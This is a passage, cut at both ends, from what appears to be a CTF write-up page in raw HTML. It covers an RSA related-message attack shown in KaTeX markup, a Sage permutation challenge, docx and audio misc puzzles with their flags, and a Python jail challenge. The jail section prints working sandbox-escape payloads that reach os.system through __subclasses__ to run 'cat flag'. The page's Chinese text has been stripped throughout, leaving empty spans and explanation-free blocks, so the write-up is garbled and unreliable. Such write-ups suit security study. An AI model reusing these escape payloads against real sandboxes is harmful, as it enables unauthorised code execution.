cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mo stretchy="false">(</mo><mi>X</mi><mo></mo><msub><mi>M</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mi>Q</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo></mo><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(X-M_{1})Q(X_{1})\equiv 0(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>X</mi><mo></mo><msub><mi>M</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mi>Q</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo></mo><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(X-M_{1})Q(X_{2})\equiv 0(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><msub><mi>M</mi><mn>1</mn></msub><mtext></mtext><mi>Q</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mtext></mtext></mrow><annotation encoding="application/x-tex">M_{1}Q(X_{i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>G</mi><mi>C</mi><mi>D</mi><mtext></mtext><mi>X</mi><mo></mo><msub><mi>M</mi><mn>1</mn></msub><mtext></mtext><mi>n</mi><mtext></mtext><mi>X</mi><mo>+</mo><msup><mi>M</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msup><mtext></mtext></mrow><annotation encoding="application/x-tex">GCDX-M_{1}nX+M&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">n</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>M</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msup><mo>=</mo><mo></mo><msub><mi>M</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi><mo stretchy="false">)</mo><mtext></mtext><mi>M</mi><mo>=</mo><mo></mo><msup><mi>M</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">M&#x27;=-M_{1}(mod\ n)M=-M&#x27;(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><msub><mi>M</mi><mn>1</mn></msub><msub><mi>M</mi><mn>2</mn></msub><mtext></mtext></mrow><annotation encoding="application/x-tex">M_{1}M_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><msub><mi>M</mi><mn>1</mn></msub><mtext></mtext></mrow><annotation encoding="application/x-tex">M_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span></p><p><code>cnss&#123;Half-GCD 1s so u5eful!&#125;</code><br /><code>Related Message Attack</code></p><h2 id="permutation"><a class="markdownIt-Anchor" href="#permutation"></a>  Permutation</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">P = Permutations(<span class="number">256</span>).random_element()</span><br><span class="line"><span class="built_in">print</span>(P**<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>([x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(hashlib.sha512(<span class="built_in">str</span>(P).encode()).digest(), flag)])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[37, 12, 147, 180, 109, 42, 193, 61, 114, 167, 89, 229, 47, 30, 139, 226, 238, 200, 152, 210, 201, 103, 236, 130, 53, 16, 132, 39, 64, 29, 99, 36, 8, 4, 124, 58, 145, 54, 211, 223, 242, 146, 234, 43, 143, 235, 173, 231, 62, 115, 121, 9, 131, 102, 255, 49, 217, 24, 17, 212, 21, 117, 163, 172, 28, 68, 233, 25, 166, 67, 137, 136, 122, 207, 196, 222, 106, 128, 108, 156, 74, 220, 33, 83, 120, 45, 76, 170, 104, 133, 78, 254, 57, 191, 183, 181, 253, 123, 112, 134, 96, 44, 240, 195, 6, 82, 216, 7, 192, 111, 189, 190, 71, 98, 70, 218, 127, 251, 155, 256, 159, 19, 151, 252, 113, 116, 59, 160, 239, 92, 148, 202, 169, 248, 129, 203, 187, 27, 23, 153, 13, 162, 144, 51, 38, 10, 41, 107, 81, 186, 177, 164, 204, 20, 161, 157, 52, 224, 119, 14, 228, 72, 250, 69, 140, 101, 214, 205, 174, 77, 118, 232, 86, 176, 219, 91, 215, 60, 158, 197, 194, 221, 2, 94, 87, 88, 245, 80, 154, 5, 165, 40, 79, 150, 26, 126, 15, 3, 105, 175, 48, 50, 55, 206, 237, 90, 149, 184, 243, 31, 65, 11, 182, 84, 18, 199, 141, 85, 225, 142, 66, 185, 178, 179, 125, 93, 247, 75, 208, 171, 97, 246, 227, 46, 1, 34, 209, 110, 56, 22, 32, 135, 168, 244, 230, 95, 138, 73, 249, 100, 35, 63, 213, 241, 198, 188]</span></span><br><span class="line"><span class="string">[218, 197, 209, 36, 168, 67, 208, 21, 66, 22, 197, 141, 81, 24, 174, 245, 184, 56, 60, 64, 228, 224, 33, 91, 234, 61, 68, 241, 222, 169, 216, 172, 219, 43, 39, 37, 249, 11]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>bricsctf-2023-Quals</strong><a href="https://tangcuxiaojikuai.xyz/post/97bbcbc9.html">-sqrt</a></p><p><a href="https://github.com/C4T-BuT-S4D/bricsctf-2023-stage1/blob/master/tasks/crp/sqrt/solve/5.py"></a></p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id=""><a class="markdownIt-Anchor" href="#"></a>  </h2><p><code>docdocxXML</code></p><p><code>word/media</code><br /><img src="https://pic1.zhimg.com/80/v2-8169baae2f6395c06af9a525e9fc72a4_1440w.png" alt="" /><br /><code>W5_w0RD_Bt_M3!&#125;</code></p><p><code>word/embeddings/oleObject21.bIn</code><br /><code>010</code><br /><code>cnss&#123;N0bodY_Kn0</code><br /><code>flag</code></p><p><code>flag: cnss&#123;N0bodY_Kn0W5_w0RD_Bt_M3!&#125;</code></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a>  </h2><p><code>Audacity</code><br /><img src="https://pic1.zhimg.com/80/v2-be9d26046a732d8fab6ecf82c7e33106_1440w.png" alt="" /><br /><br /><code>CNSS&#123;DR34M~UND3RN347H~5T4R11GH7&#125;</code></p><h2 id="-jailbreak"><a class="markdownIt-Anchor" href="#-jailbreak"></a>  jailbreak</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">jail-<span class="number">0.</span>py</span><br><span class="line"><span class="comment"># FROM python:3.12.3-alpine</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line">BANNER = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">          .?77777777777777$.            </span></span><br><span class="line"><span class="string">          777..777777777777$+           </span></span><br><span class="line"><span class="string">         .77    7777777777$$$           </span></span><br><span class="line"><span class="string">         .777 .7777777777$$$$           </span></span><br><span class="line"><span class="string">         .7777777777777$$$$$$           </span></span><br><span class="line"><span class="string">         ..........:77$$$$$$$           </span></span><br><span class="line"><span class="string">  .77777777777777777$$$$$$$$$.=======.  </span></span><br><span class="line"><span class="string"> 777777777777777777$$$$$$$$$$.========  </span></span><br><span class="line"><span class="string">7777777777777777$$$$$$$$$$$$$.========= </span></span><br><span class="line"><span class="string">77777777777777$$$$$$$$$$$$$$$.========= </span></span><br><span class="line"><span class="string">777777777777$$$$$$$$$$$$$$$$ :========+.</span></span><br><span class="line"><span class="string">77777777777$$$$$$$$$$$$$$+..=========++~</span></span><br><span class="line"><span class="string">777777777$$..~=====================+++++</span></span><br><span class="line"><span class="string">77777777$~.~~~~=~=================+++++.</span></span><br><span class="line"><span class="string">777777$$$.~~~===================+++++++.</span></span><br><span class="line"><span class="string">77777$$$$.~~==================++++++++: </span></span><br><span class="line"><span class="string"> 7$$$$$$$.==================++++++++++. </span></span><br><span class="line"><span class="string"> .,$$$$$$.================++++++++++~.  </span></span><br><span class="line"><span class="string">         .=========~.........           </span></span><br><span class="line"><span class="string">         .=============++++++           </span></span><br><span class="line"><span class="string">         .===========+++..+++           </span></span><br><span class="line"><span class="string">         .==========+++.  .++           </span></span><br><span class="line"><span class="string">          ,=======++++++,,++,           </span></span><br><span class="line"><span class="string">          ..=====+++++++++=.            </span></span><br><span class="line"><span class="string">                ..~+=...     </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> Filter out more dangerous operations</span></span><br><span class="line">FORBIDDEN = [</span><br><span class="line">    ast.Import,</span><br><span class="line">    ast.ImportFrom,</span><br><span class="line">    ast.ClassDef,</span><br><span class="line">    ast.Assign,</span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">c</span>):</span><br><span class="line">    c = ast.parse(c, mode=<span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ast.walk(c):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(i) <span class="keyword">in</span> FORBIDDEN:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="built_in">print</span>(BANNER)</span><br><span class="line">code = <span class="built_in">input</span>(<span class="string">&quot;Enter base64 encoded code: &quot;</span>)</span><br><span class="line">code = base64.b64decode(code.strip()).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(code) &gt; <span class="number">0x1000</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Code too long&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> check(code):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Forbidden operation detected&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    code = <span class="built_in">compile</span>(code, <span class="string">&#x27;&lt;CNSS&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(code, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;&#125;)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>nc 156.238.233.117 47800</code><br /><code>exec</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> AST </span><br><span class="line">ast.Import: import(import os)</span><br><span class="line">ast.ImportFrom: fromimport</span><br><span class="line">ast.ClassDef:  (class A:)</span><br><span class="line">ast.Assign: (a=1,a=b)</span><br><span class="line"></span><br><span class="line">compile()  AST </span><br><span class="line"> Python  AST </span><br><span class="line"> Python </span><br><span class="line"> AST </span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>  <span class="built_in">exec</span>  <span class="built_in">exec</span>  \n    <span class="built_in">eval</span>  <span class="built_in">exec</span>  <span class="built_in">eval</span> </span><br><span class="line"><span class="built_in">eval</span>  compile  <span class="built_in">exec</span> </span><br><span class="line"></span><br><span class="line">__builtins__</span><br><span class="line"></span><br><span class="line"> &#123;<span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;&#125; </span><br></pre></td></tr></table></figure><p></p><p><a href="https://dummykitty.github.io/python/2023/05/29/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86.html#exec-%E5%87%BD%E6%95%B0">https://dummykitty.github.io/python/2023/05/29/python-.html#exec-</a></p><p><a href="https://zhuanlan.zhihu.com/p/578966149">https://zhuanlan.zhihu.com/p/578966149</a></p><p><a href="https://jbnrz.com.cn/index.php/2024/05/19/pyjail/">https://jbnrz.com.cn/index.php/2024/05/19/pyjail/</a></p><p><a href="https://www.viewofthai.link/2023/05/11/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://www.viewofthai.link/2023/05/11/python-/</a></p><p><a href="https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7DyGQG8D909mL6o3x#toc-22">https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7DyGQG8D909mL6o3x#toc-22</a><br /><code>SSTI</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__() <span class="keyword">if</span> i.__name__ == <span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;cat flag&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>CNSS&#123;a7_e4sy_p5_ja1l&#125;</code><br /><code>pyjail</code></p><h2 id="-jailbreak-again"><a class="markdownIt-Anchor" href="#-jailbreak-again"></a>  jailbreak-again()</h2><p><code>nc 156.238.233.117 47801</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 